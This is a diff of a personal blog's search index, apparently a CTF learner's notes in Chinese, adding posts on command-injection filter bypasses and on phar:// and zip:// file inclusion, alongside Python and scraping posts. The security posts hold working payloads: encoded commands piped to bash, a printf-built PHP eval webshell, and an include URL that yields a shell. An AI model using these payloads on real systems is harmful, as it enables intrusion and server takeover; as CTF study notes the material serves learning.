     <url>/2020/10/10/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/</url>
     <content><![CDATA[<p>针对ctf中伪随机数漏洞利用的小结</p>
@@ -1902,6 +1818,111 @@ file -f:报错出具体内容</p>
       </categories>
   </entry>
   <entry>
+    <title>ping命令执行及bypass</title>
+    <url>/2020/11/27/ping%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8Abypass/</url>
+    <content><![CDATA[<p>常见bypass及一些奇淫技巧</p>
+<a id="more"></a>
+<h2 id="管道符"><a class="header-anchor" href="#管道符">¶</a>管道符</h2>
+<h3 id="windows-下"><a class="header-anchor" href="#windows-下">¶</a>windows 下</h3>
+<blockquote>
+<p><code>|</code>直接执行后面的语句<br>
+<code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>
+<code>&amp;</code>前面和后面命令都要执行，无论前面真假<br>
+<code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
+</blockquote>
+<h3 id="Linux-下"><a class="header-anchor" href="#Linux-下">¶</a>Linux 下</h3>
+<blockquote>
+<p><code>;</code>前面和后面命令都要执行，无论前面真假<br>
+<code>|</code>直接执行后面的语句<br>
+<code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>
+<code>&amp;</code>前面和后面命令都要执行，无论前面真假<br>
+<code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
+</blockquote>
+<h2 id="命令分割符被过滤"><a class="header-anchor" href="#命令分割符被过滤">¶</a>命令分割符被过滤</h2>
+<p>使用下面两个</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%0a换行符，需要php环境</span><br><span class="line">%0d回车符，需要php环境</span><br></pre></td></tr></table></figure>
+<h2 id="空格绕过"><a class="header-anchor" href="#空格绕过">¶</a>空格绕过</h2>
+<p>常见的绕过符号有： $IFS$9 、${IFS} 、%09(php环境下)、 重定向符&lt;&gt;、&gt;<br>
+$IFS在linux下表示分隔符，如果不加{}则bash会将IFS解释为一个变量名，<br>
+加一个{}就固定了变量名，$IFS$9后面之所以加个$是为了起到截断的作用 ;为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。<br>
+不仅 $9可以使用，我试了试其他的数字也都可以正确绕过。</p>
+<h2 id="过滤目录分隔符"><a class="header-anchor" href="#过滤目录分隔符">¶</a>过滤目录分隔符</h2>
+<p>目录分隔符<code>/</code>我们可以使用<code>$HOME</code>代替，HOME也是shell中的一个环境变量，表示当前用户的根目录，我们可以看看当前用户的HOME值是什么</p>
+<p><a href="https://imgchr.com/i/sCegiD"><img src="https://s3.ax1x.com/2021/01/03/sCegiD.png" alt="sCegiD.png"></a></p>
+<p>可以看到当前用户的根目录是/home/www-data，我们只需要/，所以我们可以用${HOME:0:1}来实现</p>
+<h2 id="关键词过滤"><a class="header-anchor" href="#关键词过滤">¶</a>关键词过滤</h2>
+<h3 id="单引号绕过"><a class="header-anchor" href="#单引号绕过">¶</a>单引号绕过</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w&#39;h&#39;o&#39;am&#39;i</span><br></pre></td></tr></table></figure>
+<h3 id="双引号绕过"><a class="header-anchor" href="#双引号绕过">¶</a>双引号绕过</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w&quot;h&quot;o&quot;am&quot;i</span><br></pre></td></tr></table></figure>
+<h3 id="反斜线"><a class="header-anchor" href="#反斜线">¶</a>反斜线</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure>
+<h3 id="正则-假设-bin-cat-test-是一个目录"><a class="header-anchor" href="#正则-假设-bin-cat-test-是一个目录">¶</a>正则 (假设/bin/cat: test: 是一个目录)</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;&#96;</span><br><span class="line">&#96;&#x2F;???&#x2F;?at ????&#96;</span><br><span class="line">&#96;&#x2F;???&#x2F;?[a]&#39;&#39;[t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</span><br></pre></td></tr></table></figure>
+<h3 id="使用-绕过"><a class="header-anchor" href="#使用-绕过">¶</a>使用 $@ 绕过</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">who$@ami</span><br></pre></td></tr></table></figure>
+<h3 id="用通配符绕过"><a class="header-anchor" href="#用通配符绕过">¶</a>用通配符绕过</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell C:\*\*2\n??e*d.*? # notepad</span><br></pre></td></tr></table></figure>
+<h3 id="cat被过滤"><a class="header-anchor" href="#cat被过滤">¶</a>cat被过滤</h3>
+<blockquote>
+<p>more:一页一页的显示档案内容<br>
+less:与 more 类似<br>
+head:查看头几行<br>
+tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>
+tail:查看尾几行<br>
+nl：显示的时候，顺便输出行号<br>
+od:以二进制的方式读取档案内容<br>
+vi:一种编辑器，这个也可以查看<br>
+vim:一种编辑器，这个也可以查看<br>
+sort:可以查看<br>
+uniq:可以查看<br>
+file -f:报错出具体内容</p>
+</blockquote>
+<h2 id="命令执行函数被过滤"><a class="header-anchor" href="#命令执行函数被过滤">¶</a>命令执行函数被过滤</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure>
+<h2 id="利用编码绕过"><a class="header-anchor" href="#利用编码绕过">¶</a>利用编码绕过</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#base64</span><br><span class="line">echo Y2F0IC9mbGFn|base64 -d|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">echo Y2F0IC9mbGFn|base64 -d|sh&#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">echo Y2F0IGZsYWcucGhw|base64 -d|bash&#x3D;&#x3D;&gt;cat flag.php</span><br><span class="line">echo Y2F0IGZsYWcucGhw|base64 -d|sh&#x3D;&#x3D;&gt;cat flag.php</span><br><span class="line">#hex</span><br><span class="line">echo &quot;0x636174202f666c6167&quot; | xxd -r -p|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">#oct&#x2F;字节</span><br><span class="line">$(printf &quot;\154\163&quot;) &#x3D;&#x3D;&gt;ls</span><br><span class="line">$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">#i也可以通过这种方式写马</span><br><span class="line">内容为&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;</span><br><span class="line">$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php</span><br></pre></td></tr></table></figure>
+<h2 id="奇淫妓巧"><a class="header-anchor" href="#奇淫妓巧">¶</a>奇淫妓巧</h2>
+<h3 id="内联执行执行"><a class="header-anchor" href="#内联执行执行">¶</a>内联执行执行</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat$IFS$9&#96;ls&#96;</span><br><span class="line">cat$IFS$9$(ls)</span><br><span class="line">这两个命令也意思就是执行当前目录下的所有文件</span><br></pre></td></tr></table></figure>
+<p><strong>(内联，就是将``或$()内命令的输出作为输入执行)</strong></p>
+<hr>
+<h3 id="利用ls-t和-以及换行符绕过长度限制执行命令-文件构造绕过"><a class="header-anchor" href="#利用ls-t和-以及换行符绕过长度限制执行命令-文件构造绕过">¶</a>利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面# echo &quot;flag&#123;hahaha&#125;&quot; &gt; flag.txt</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;ag&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;fl\\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;t \\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;ca\\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# ls -t</span><br><span class="line">&#39;ca\&#39;  &#39;t \&#39;  &#39;fl\&#39;   ag   flag</span><br><span class="line">root@kali:~&#x2F;桌面# ls -t &gt;a     #将 ls -t 内容写入到a文件中</span><br><span class="line">root@kali:~&#x2F;桌面# sh a</span><br><span class="line">a: 1: a: not found</span><br><span class="line">flag&#123;hahaha&#125;</span><br><span class="line">a: 6: flag.txt: not found</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\ 是指换行</span><br><span class="line">ls -t将文件按时间排序输出</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure>
+<p><strong>参考博客</strong>  <a href="https://www.cnblogs.com/NPFS/p/13279815.html">https://www.cnblogs.com/NPFS/p/13279815.html</a></p>
+<p>​                 <a href="https://www.cnblogs.com/micr067/p/12590152.html">https://www.cnblogs.com/micr067/p/12590152.html</a></p>
+<p>​                 <a href="https://blog.csdn.net/qq_45552960/article/details/104576189">https://blog.csdn.net/qq_45552960/article/details/104576189</a></p>
+<p>​                 <a href="https://blog.csdn.net/qq_42812036/article/details/104297163">https://blog.csdn.net/qq_42812036/article/details/104297163</a></p>
+<p>​                 <a href="https://www.freesion.com/article/9046720644/">https://www.freesion.com/article/9046720644/</a></p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>命令执行</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>python之字符串前面加u,r,f的含义</title>
+    <url>/2021/01/08/python%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%89%8D%E9%9D%A2%E5%8A%A0u,r,f%E7%9A%84%E5%90%AB%E4%B9%89/</url>
+    <content><![CDATA[<p>版本 python3.6及以上</p>
+<a id="more"></a>
+<p><strong>1.u:表示unicode字符串</strong><br>
+字符串中存在中文的字符，在前面加上u</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; u&#39;这是一个中文的字符串。&#39;</span><br></pre></td></tr></table></figure>
+<p><strong>2.r:表示非转义的原始字符串</strong><br>
+字符串中存在\，要让它失效，要在前面加上r</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  print(r&#39;今天是七夕节,\n但是还是要加班！&#39;) #加上r就是\不转义</span><br><span class="line">  今天是七夕节,\n但是还是要加班！</span><br><span class="line">  </span><br><span class="line">print(&#39;今天是七夕节,\t但是还是要加班！&#39;)  #不加上r就是\转义</span><br><span class="line">今天是七夕节,	但是还是要加班！</span><br></pre></td></tr></table></figure>
+<p><strong>3.f:表示在字符串内支持大括号内的python 表达式</strong></p>
+<p>f-strings 是指以 f 或 F 开头的字符串，其中以 {} 包含的表达式会进行值替换。（目前支持python3.6版本）</p>
+<p>下面看下 f-strings 的使用方法</p>
+<p>基本使用（作用：替换值）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;name &#x3D; &#39;hoxis&#39;</span><br><span class="line">&gt;&gt;&gt; age &#x3D; 18</span><br><span class="line">&gt;&gt;&gt; f&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">#结果如下</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br><span class="line">&gt;&gt;&gt; F&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>编程学习</category>
+        <category>python</category>
+      </categories>
+  </entry>
+  <entry>
     <title>python爬虫学习(二)</title>
     <url>/2021/02/21/python%E4%B9%8Bxpath%E7%88%AC%E5%8F%96%E7%BB%83%E4%B9%A0%E6%A1%88%E4%BE%8B/</url>
     <content><![CDATA[<p>这两个案例用到了数据解析  我这里主要用的是xpath  当然也可以用正则或者b64</p>
@@ -1925,27 +1946,6 @@ file -f:报错出具体内容</p>
 <p>因为第一页的url格式不太一样 我懒 所以先这样吧</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">url=<span class="string">&#x27;http://pic.netbian.com/4kfengjing/&#x27;</span></span><br><span class="line"><span class="comment"># http://pic.netbian.com/4kfengjing/index_3.html</span></span><br><span class="line">head=&#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n=<span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;输入页数&quot;</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,n+<span class="number">2</span>):</span><br><span class="line">        url1=<span class="string">f&#x27;http://pic.netbian.com/4kfengjing/index_<span class="subst">&#123;i&#125;</span>.html&#x27;</span></span><br><span class="line">        response=requests.get(url=url1,headers=head).text</span><br><span class="line">        tree=etree.HTML(response)</span><br><span class="line">        img_list=tree.xpath(<span class="string">&#x27;//li//img&#x27;</span>)</span><br><span class="line">        <span class="comment"># //li//img/@src</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> img_list:</span><br><span class="line">            src=i.xpath(<span class="string">&#x27;./@src&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            title=i.xpath(<span class="string">&#x27;./@alt&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="comment"># 通用处理中文乱码的解决方案</span></span><br><span class="line">            title = title.encode(<span class="string">&#x27;iso-8859-1&#x27;</span>).decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">            <span class="comment">#print(title)</span></span><br><span class="line">            url2=<span class="string">&quot;http://pic.netbian.com&quot;</span>+src</span><br><span class="line">            print(url2)</span><br><span class="line">            img_path = <span class="string">&#x27;./4K/&#x27;</span> + title+<span class="string">&#x27;.jpg&#x27;</span></span><br><span class="line">            response2=requests.get(url=url2,headers=head).content</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(img_path, <span class="string">&#x27;wb&#x27;</span>,) <span class="keyword">as</span> fp:</span><br><span class="line">                fp.write(response2)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 ]]></content>
-      <categories>
-        <category>编程学习</category>
-        <category>python</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>python之字符串前面加u,r,f的含义</title>
-    <url>/2021/01/08/python%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%89%8D%E9%9D%A2%E5%8A%A0u,r,f%E7%9A%84%E5%90%AB%E4%B9%89/</url>
-    <content><![CDATA[<p>版本 python3.6及以上</p>
-<a id="more"></a>
-<p><strong>1.u:表示unicode字符串</strong><br>
-字符串中存在中文的字符，在前面加上u</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; u&#39;这是一个中文的字符串。&#39;</span><br></pre></td></tr></table></figure>
-<p><strong>2.r:表示非转义的原始字符串</strong><br>
-字符串中存在\，要让它失效，要在前面加上r</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  print(r&#39;今天是七夕节,\n但是还是要加班！&#39;) #加上r就是\不转义</span><br><span class="line">  今天是七夕节,\n但是还是要加班！</span><br><span class="line">  </span><br><span class="line">print(&#39;今天是七夕节,\t但是还是要加班！&#39;)  #不加上r就是\转义</span><br><span class="line">今天是七夕节,	但是还是要加班！</span><br></pre></td></tr></table></figure>
-<p><strong>3.f:表示在字符串内支持大括号内的python 表达式</strong></p>
-<p>f-strings 是指以 f 或 F 开头的字符串，其中以 {} 包含的表达式会进行值替换。（目前支持python3.6版本）</p>
-<p>下面看下 f-strings 的使用方法</p>
-<p>基本使用（作用：替换值）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;name &#x3D; &#39;hoxis&#39;</span><br><span class="line">&gt;&gt;&gt; age &#x3D; 18</span><br><span class="line">&gt;&gt;&gt; f&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">#结果如下</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br><span class="line">&gt;&gt;&gt; F&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>编程学习</category>
         <category>python</category>
@@ -2960,6 +2960,45 @@ post数据<code>name = a' union select 1,2,3 -- +</code></p>
       </categories>
   </entry>
   <entry>
+    <title>phar及zip文件包含</title>
+    <url>/2020/12/06/zip%E5%92%8Cphar%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<p>phar与zip协议的文件包含</p>
+<a id="more"></a>
+<h2 id="phar文件包含"><a class="header-anchor" href="#phar文件包含">¶</a>phar文件包含</h2>
+<p>phar协议要求：php大于5.3.0</p>
+<p>需要将php.ini的参数phar.readonly设置为off</p>
+<p><strong>这个方法适用于验证包含文件为特定后缀时。</strong></p>
+<p>使用<code>Phar://</code>伪协议流可以Bypass一些上传的waf，大多数情况下和文件包含一起使用，就类似于我们的压缩包（其实就是一个压缩包），只不过我们换了一种方式去执行而已</p>
+<p>本地测试：</p>
+<p>test.php</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后将test.php压缩，将压缩文件改后缀为<code>.jpg</code><br>
+index.php</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include(&#39;phar:&#x2F;&#x2F;.&#x2F;test.jpg&#x2F;test.php&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>成功包含</p>
+<p><img src="http://ww1.sinaimg.cn/large/007CwoFZly1gle532gfazj319n0knaby.jpg" alt="QQ截图20201206145217.png"></p>
+<h2 id="zip协议包含文件"><a class="header-anchor" href="#zip协议包含文件">¶</a>zip协议包含文件</h2>
+<p>zip协议要求：php版本要求大于等于5.3.0</p>
+<p>这个方法适用于验证包含文件为特定后缀时。 例如以下代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">if(isset($file) &amp;&amp; strtolower(substr($file, -4)) &#x3D;&#x3D; &quot;.jpg&quot;)&#123;</span><br><span class="line">	include($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">&lt;?php</span><br><span class="line">$file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">include($file.&#39;.jpg&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>上面的代码一个验证了后缀是否为jpg，一个是直接添加了jpg后缀，然后才包含。对于现在这种情况，要包含php文件的话的，可以通过截断。但是\x00的截断在php&gt;5.3.4就没用了，而且还要考虑GPC,所以是比较鸡肋的方法。其实我们可以通过zip协议和phar协议来包含文件。</p>
+<p><strong>zip://</strong></p>
+<p>首先我们新建一个zip文件，里面压缩着一个php脚本。</p>
+<p><img src="https://bl4ck.in/old_img/2017-04-17-2355213942.png" alt="2355213942"></p>
+<p>然后我们构造zip://php.zip#php.jpg</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?file&#x3D;zip:&#x2F;&#x2F;php.zip%23php.jpg</span><br></pre></td></tr></table></figure>
+<p><img src="https://bl4ck.in/old_img/2017-04-17-819654707.png" alt="819654707"></p>
+<p>这样就成功shell了。</p>
+<p>参考https://xz.aliyun.com/t/3692</p>
+<p><a href="https://bl4ck.in/tricks/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html">https://bl4ck.in/tricks/2015/06/10/zip或phar协议包含文件.html</a></p>
+<p><a href="https://lightless.me/archives/include-file-from-zip-or-phar.html">https://lightless.me/archives/include-file-from-zip-or-phar.html</a></p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>文件包含</category>
+      </categories>
+  </entry>
+  <entry>
     <title>vmware三种网络工作模式</title>
     <url>/2021/06/01/vmware%E4%B8%89%E7%A7%8D%E7%BD%91%E7%BB%9C%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/</url>
     <content><![CDATA[<h1>vmware三种网络工作模式</h1>
@@ -3039,45 +3078,6 @@ post数据<code>name = a' union select 1,2,3 -- +</code></p>
       <categories>
         <category>其它</category>
         <category>vmware</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>phar及zip文件包含</title>
-    <url>/2020/12/06/zip%E5%92%8Cphar%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
-    <content><![CDATA[<p>phar与zip协议的文件包含</p>
-<a id="more"></a>
-<h2 id="phar文件包含"><a class="header-anchor" href="#phar文件包含">¶</a>phar文件包含</h2>
-<p>phar协议要求：php大于5.3.0</p>
-<p>需要将php.ini的参数phar.readonly设置为off</p>
-<p><strong>这个方法适用于验证包含文件为特定后缀时。</strong></p>
-<p>使用<code>Phar://</code>伪协议流可以Bypass一些上传的waf，大多数情况下和文件包含一起使用，就类似于我们的压缩包（其实就是一个压缩包），只不过我们换了一种方式去执行而已</p>
-<p>本地测试：</p>
-<p>test.php</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;</span><br></pre></td></tr></table></figure>
-<p>然后将test.php压缩，将压缩文件改后缀为<code>.jpg</code><br>
-index.php</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include(&#39;phar:&#x2F;&#x2F;.&#x2F;test.jpg&#x2F;test.php&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>成功包含</p>
-<p><img src="http://ww1.sinaimg.cn/large/007CwoFZly1gle532gfazj319n0knaby.jpg" alt="QQ截图20201206145217.png"></p>
-<h2 id="zip协议包含文件"><a class="header-anchor" href="#zip协议包含文件">¶</a>zip协议包含文件</h2>
-<p>zip协议要求：php版本要求大于等于5.3.0</p>
-<p>这个方法适用于验证包含文件为特定后缀时。 例如以下代码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">if(isset($file) &amp;&amp; strtolower(substr($file, -4)) &#x3D;&#x3D; &quot;.jpg&quot;)&#123;</span><br><span class="line">	include($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">&lt;?php</span><br><span class="line">$file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">include($file.&#39;.jpg&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>上面的代码一个验证了后缀是否为jpg，一个是直接添加了jpg后缀，然后才包含。对于现在这种情况，要包含php文件的话的，可以通过截断。但是\x00的截断在php&gt;5.3.4就没用了，而且还要考虑GPC,所以是比较鸡肋的方法。其实我们可以通过zip协议和phar协议来包含文件。</p>
-<p><strong>zip://</strong></p>
-<p>首先我们新建一个zip文件，里面压缩着一个php脚本。</p>
-<p><img src="https://bl4ck.in/old_img/2017-04-17-2355213942.png" alt="2355213942"></p>
-<p>然后我们构造zip://php.zip#php.jpg</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?file&#x3D;zip:&#x2F;&#x2F;php.zip%23php.jpg</span><br></pre></td></tr></table></figure>
-<p><img src="https://bl4ck.in/old_img/2017-04-17-819654707.png" alt="819654707"></p>
-<p>这样就成功shell了。</p>
-<p>参考https://xz.aliyun.com/t/3692</p>
-<p><a href="https://bl4ck.in/tricks/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html">https://bl4ck.in/tricks/2015/06/10/zip或phar协议包含文件.html</a></p>
-<p><a href="https://lightless.me/archives/include-file-from-zip-or-phar.html">https://lightless.me/archives/include-file-from-zip-or-phar.html</a></p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>文件包含</category>
       </categories>
   </entry>
   <entry>
@@ -3180,27 +3180,6 @@ index.php</p>
       </categories>
   </entry>
   <entry>
-    <title>使用超级鹰及selenium模块模拟登陆12306</title>
-    <url>/2021/02/26/%E4%BD%BF%E7%94%A8%E8%B6%85%E7%BA%A7%E9%B9%B0%E5%8F%8Aselenium%E6%A8%A1%E5%9D%97%E6%A8%A1%E6%8B%9F%E7%99%BB%E9%99%8612306/</url>
-    <content><![CDATA[<p>完整代码如下</p>
-<p>吐槽一下图片定位和定位点击我都用了很笨的方法  因为正规老是有偏移</p>
-<h2 id="超级鹰介绍"><a class="header-anchor" href="#超级鹰介绍">¶</a>超级鹰介绍</h2>
-<p>网址: <a href="https://www.chaojiying.com/user/">https://www.chaojiying.com/user/</a></p>
-<p>进去后注册一个普通用户</p>
-<p>在开发文档下载python3的代码</p>
-<p>在软件id创建一个id  然后充值一块钱</p>
-<p><img src="https://img-blog.csdnimg.cn/20210226134331670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="超级鹰使用介绍"><a class="header-anchor" href="#超级鹰使用介绍">¶</a>超级鹰使用介绍</h2>
-<p>代码拷贝下来后 可以用他的示例代码和图片进行测试 具体示例代码都有注释 自行查看</p>
-<h2 id="爬取12306完整代码"><a class="header-anchor" href="#爬取12306完整代码">¶</a>爬取12306完整代码</h2>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ChromeOptions</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chaojiying_Client</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, username, password, soft_id</span>):</span></span><br><span class="line">        self.username = username</span><br><span class="line">        password = password.encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.password = md5(password).hexdigest()</span><br><span class="line">        self.soft_id = soft_id</span><br><span class="line">        self.base_params = &#123;</span><br><span class="line">            <span class="string">&#x27;user&#x27;</span>: self.username,</span><br><span class="line">            <span class="string">&#x27;pass2&#x27;</span>: self.password,</span><br><span class="line">            <span class="string">&#x27;softid&#x27;</span>: self.soft_id,</span><br><span class="line">        &#125;</span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;Keep-Alive&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">PostPic</span>(<span class="params">self, im, codetype</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        im: 图片字节</span></span><br><span class="line"><span class="string">        codetype: 题目类型 参考 http://www.chaojiying.com/price.html</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;codetype&#x27;</span>: codetype,</span><br><span class="line">        &#125;</span><br><span class="line">        params.update(self.base_params)</span><br><span class="line">        files = &#123;<span class="string">&#x27;userfile&#x27;</span>: (<span 